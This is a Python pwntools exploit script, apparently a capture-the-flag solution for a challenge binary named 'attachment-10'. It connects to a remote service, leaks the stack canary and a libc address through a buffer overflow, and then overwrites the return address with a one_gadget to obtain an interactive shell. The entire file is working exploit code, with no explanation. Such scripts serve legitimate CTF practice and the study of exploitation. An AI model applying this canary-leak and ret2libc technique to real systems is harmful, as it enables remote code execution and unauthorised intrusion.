#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "amd64",os = "linux", log_level = "debug")


p = remote("123.57.69.203", 7020)
# p = process('./attachment-10')
elf = ELF('./attachment-10')
# gdb_command = ""
# gdb.attach(p, gdb_command)
# time.sleep(2)


# Get canary
p.recvuntil('Hello CTFer! Welcome to the world of pwn~\n')
p.send('48 ' * 217 + 'a')
p.recvuntil('0' * 217)
canary = u64('\x00' + p.recv(7))
rbp = u64(p.recv(6) + '\x00' * 2)
log.info('canary: ' + hex(canary))
log.info('rbp: ' + hex(rbp))

p.send('\x00' * 216 + p64(canary) + p64(rbp - 0xa8) + '\x01') # _IO_2_1_stdout_

# Get address of Libc
p.recvuntil('Your input is: ')
libc_base = u64(p.recv(6) + '\x00' * 2) - 0x3ec760 # _IO_2_1_stdout_
log.info('libc_base: ' + hex(libc_base))


one_gadget = libc_base + 0x4f302
p.send('/bin/sh\x00' + '\x00' * 208 + p64(canary) + p64(rbp) + p64(one_gadget))

p.interactive()
